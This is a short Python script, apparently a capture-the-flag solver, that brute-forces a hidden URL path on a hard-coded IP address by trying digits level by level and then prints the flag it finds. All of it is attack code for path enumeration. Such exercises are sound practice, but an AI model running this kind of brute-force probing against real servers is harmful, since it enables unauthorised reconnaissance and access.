import requests

URL = "http://13.232.135.193:5000"
MAX_DEPTH = 10


def brute_path():
    found_url = URL
    for iteration in range(MAX_DEPTH):
        for path_digit in range(10):
            current_url = f"{found_url}/{path_digit}"
            print(f"Trying URL: {current_url}")
            r = requests.get(current_url)
            if r.status_code == 200:
                print(f"Found 200 response: {current_url}\n")
                found_url = current_url
                break

    print(f"\nFound the URL: {found_url}.")
    response = requests.get(found_url)
    print(f"Flag value: {response.text}")


if __name__ == "__main__":
    brute_path()
